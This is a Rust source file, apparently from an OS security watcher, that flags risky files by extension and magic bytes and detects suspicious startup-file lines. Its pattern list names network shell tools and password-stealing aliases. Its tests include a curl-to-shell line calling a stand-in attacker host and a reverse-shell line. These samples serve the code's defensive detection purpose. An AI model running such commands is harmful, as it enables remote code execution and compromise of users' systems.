// SPDX-License-Identifier: GPL-3.0-or-later
// Copyright (C) 2026 Proton OS contributors

//! Which files are "risky" (can run, install, or carry a hidden program) and which text looks
//! like something an attacker would add to a startup file.
//!
//! Used by the background watchers to decide what to check first and what to check even when
//! it is big or in a place that is otherwise skipped (`/tmp`, photos on a USB drive). Nothing
//! here runs a file: content checks read at most the first few bytes, or the first 64 KB of a
//! small text file.

use std::io::Read;
use std::os::unix::fs::PermissionsExt;
use std::path::Path;

/// Extensions of files that can run, install something, or open with a program that has had
/// many security holes (documents, archives). Compared lower-case.
pub const RISKY_EXT: &[&str] = &[
    // Linux programs, installers and scripts
    "sh",
    "bash",
    "zsh",
    "run",
    "bin",
    "appimage",
    "deb",
    "rpm",
    "snap",
    "flatpak",
    "flatpakref",
    "desktop",
    "py",
    "pl",
    "rb",
    "php",
    "js",
    "jar", // Windows programs and scripts
    "exe",
    "msi",
    "com",
    "scr",
    "dll",
    "bat",
    "cmd",
    "ps1",
    "vbs",
    "hta",
    "lnk",
    // Documents that can carry macros or exploits
    "pdf",
    "rtf",
    "doc",
    "xls",
    "ppt",
    "docm",
    "xlsm",
    "pptm",
    "odt",
    "ods",
    // Archives and disk images (can hide any of the above)
    "zip",
    "7z",
    "rar",
    "tar",
    "gz",
    "tgz",
    "xz",
    "bz2",
    "zst",
    "iso",
    "img",
    "cab",
];

/// The start of files whose content is a program, a document format with macros, or an
/// archive, whatever the file is called. A program renamed to `photo.jpg` is still found.
const MAGIC: &[&[u8]] = &[
    b"\x7fELF",          // Linux program
    b"#!",               // script
    b"MZ",               // Windows program
    b"%PDF",             // PDF
    b"PK\x03\x04",       // zip, jar, Office documents, apk
    b"\xd0\xcf\x11\xe0", // old Office documents, msi
    b"{\\rtf",           // RTF
    b"7z\xbc\xaf",       // 7-Zip
    b"Rar!",             // RAR
    b"\x1f\x8b",         // gzip
    b"\xfd7zXZ",         // xz
];

/// True when the file name has a risky extension (see [`RISKY_EXT`]).
pub fn risky_name(p: &Path) -> bool {
    p.extension()
        .map(|x| x.to_string_lossy().to_lowercase())
        .is_some_and(|x| RISKY_EXT.contains(&x.as_str()))
}

/// True when the file starts like a program, script, macro document or archive (see
/// [`MAGIC`]). Reads 8 bytes; a file that can't be opened counts as not risky.
pub fn risky_content(p: &Path) -> bool {
    let Ok(mut f) = std::fs::File::open(p) else {
        return false;
    };
    let mut buf = [0u8; 8];
    let mut n = 0;
    // read() may return fewer bytes than asked for; loop until full or end of file.
    while n < buf.len() {
        match f.read(&mut buf[n..]) {
            Ok(0) | Err(_) => break,
            Ok(k) => n += k,
        }
    }
    MAGIC.iter().any(|m| buf[..n].starts_with(m))
}

/// True when anyone may run the file (an executable bit is set).
///
/// Not used for USB drives: FAT, exFAT and NTFS drives often mark every file as runnable.
pub fn executable(md: &std::fs::Metadata) -> bool {
    md.permissions().mode() & 0o111 != 0
}

/// Full check for local folders: risky name, executable bit, or risky content.
pub fn risky(p: &Path, md: &std::fs::Metadata) -> bool {
    risky_name(p) || executable(md) || risky_content(p)
}

/// Text patterns that download, decode or hide a program, or open a remote shell. Rare in
/// startup files people write themselves, common in malware that wants to survive a restart.
/// Each entry is (pattern, reason shown to the user).
const SUSPICIOUS: &[(&str, &str)] = &[
    ("curl ", "downloads something from the internet"),
    ("wget ", "downloads something from the internet"),
    ("base64 -d", "decodes hidden content"),
    ("base64 --decode", "decodes hidden content"),
    ("openssl enc", "decodes hidden content"),
    ("/dev/tcp/", "opens a network connection"),
    ("/dev/udp/", "opens a network connection"),
    ("nc -e", "opens a remote shell"),
    ("ncat ", "opens a network connection"),
    ("socat ", "opens a network connection"),
    ("python -c", "runs hidden Python code"),
    ("python3 -c", "runs hidden Python code"),
    ("perl -e", "runs hidden Perl code"),
    ("/tmp/", "runs something from a temporary folder"),
    ("/dev/shm/", "runs something from a temporary folder"),
    ("/var/tmp/", "runs something from a temporary folder"),
    ("ld_preload", "loads code into every program"),
    (
        "alias sudo=",
        "replaces the sudo command (can steal your password)",
    ),
    (
        "alias su=",
        "replaces the su command (can steal your password)",
    ),
];

/// Why a line of shell or `Exec=` text looks suspicious, or `None`. Comments are ignored.
/// Matching is case-insensitive.
pub fn suspicious_line(line: &str) -> Option<&'static str> {
    let t = line.trim_start();
    if t.starts_with('#') || t.is_empty() {
        return None;
    }
    let l = t.to_lowercase();
    if let Some((_, why)) = SUSPICIOUS.iter().find(|(p, _)| contains_word(&l, p)) {
        return Some(why);
    }
    // "… | sh", "…|bash": runs whatever came before as a script. Checked as whole words, so
    // "| shuf" or "| shasum" are fine.
    for shell in ["sh", "bash", "zsh", "dash"] {
        for sep in ["| ", "|"] {
            let pat = format!("{sep}{shell}");
            let mut from = 0;
            while let Some(i) = l[from..].find(&pat) {
                let end = from + i + pat.len();
                let next = l[end..].chars().next();
                if next.is_none_or(|c| !c.is_ascii_alphanumeric() && c != '_' && c != '-') {
                    return Some("runs downloaded or hidden text as a script");
                }
                from = end;
            }
        }
    }
    None
}

/// True when `pat` occurs in `text` and, if it starts with a letter, not in the middle of a
/// word ("ncat " must not match "concat ").
fn contains_word(text: &str, pat: &str) -> bool {
    let needs_boundary = pat.starts_with(|c: char| c.is_ascii_alphanumeric());
    let mut from = 0;
    while let Some(i) = text[from..].find(pat) {
        let at = from + i;
        let before = text[..at].chars().next_back();
        if !needs_boundary || before.is_none_or(|c| !c.is_ascii_alphanumeric() && c != '_') {
            return true;
        }
        from = at + pat.len();
    }
    false
}

/// The first reason any line in `text` looks suspicious (see [`suspicious_line`]).
pub fn suspicious_text(text: &str) -> Option<&'static str> {
    text.lines().find_map(suspicious_line)
}

/// Read up to 64 KB of a text file (for heuristics). `None` for binary files, files that can't
/// be read, or files that aren't valid UTF-8 at the start.
pub fn read_text_head(p: &Path) -> Option<String> {
    let f = std::fs::File::open(p).ok()?;
    let mut buf = Vec::new();
    f.take(64 * 1024).read_to_end(&mut buf).ok()?;
    if buf.contains(&0) {
        return None; // binary
    }
    Some(String::from_utf8_lossy(&buf).into_owned())
}

/// Stable 64-bit FNV-1a hash (used to remember lines of startup files without storing their
/// text). Unlike `std`'s hasher it never changes between Rust versions, so saved baselines
/// stay valid after an update.
pub fn fnv1a(data: &[u8]) -> u64 {
    let mut h: u64 = 0xcbf2_9ce4_8422_2325;
    for b in data {
        h ^= *b as u64;
        h = h.wrapping_mul(0x0000_0100_0000_01b3);
    }
    h
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn names_and_content() {
        assert!(risky_name(Path::new("/x/Setup.EXE")));
        assert!(risky_name(Path::new("/x/tool.AppImage")));
        assert!(!risky_name(Path::new("/x/photo.jpg")));
        let d = std::env::temp_dir().join(format!("ps-risk-{}", std::process::id()));
        std::fs::create_dir_all(&d).unwrap();
        let fake = d.join("holiday.jpg");
        std::fs::write(&fake, b"\x7fELF\x02\x01\x01").unwrap();
        assert!(risky_content(&fake));
        let real = d.join("real.jpg");
        std::fs::write(&real, b"\xff\xd8\xff\xe0JFIF").unwrap();
        assert!(!risky_content(&real));
        let tiny = d.join("one");
        std::fs::write(&tiny, b"#").unwrap();
        assert!(!risky_content(&tiny));
        let _ = std::fs::remove_dir_all(&d);
    }

    #[test]
    fn suspicious_lines() {
        assert!(suspicious_line("curl -s http://evil.example/x | sh").is_some());
        assert!(suspicious_line("echo aGk= | base64 -d | bash").is_some());
        assert!(suspicious_line("alias sudo='/home/u/.x/sudo'").is_some());
        assert!(suspicious_line("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1").is_some());
        assert!(suspicious_line("cat list |sh").is_some());
        // Ordinary lines people (and installers) add.
        assert!(suspicious_line("export PATH=\"$HOME/.cargo/bin:$PATH\"").is_none());
        assert!(suspicious_line(". \"$HOME/.cargo/env\"").is_none());
        assert!(suspicious_line("[ -s \"$NVM_DIR/nvm.sh\" ] && \\. \"$NVM_DIR/nvm.sh\"").is_none());
        assert!(suspicious_line("ls | shuf | head").is_none());
        assert!(suspicious_line("# curl http://x | sh").is_none());
        assert!(suspicious_line("alias ll='ls -l'").is_none());
        assert!(suspicious_line("x=$(concat a b); sync -e").is_none());
    }

    #[test]
    fn hash_is_stable() {
        assert_eq!(fnv1a(b""), 0xcbf2_9ce4_8422_2325);
        assert_eq!(fnv1a(b"a"), 0xaf63_dc4c_8601_ec8c);
    }
}
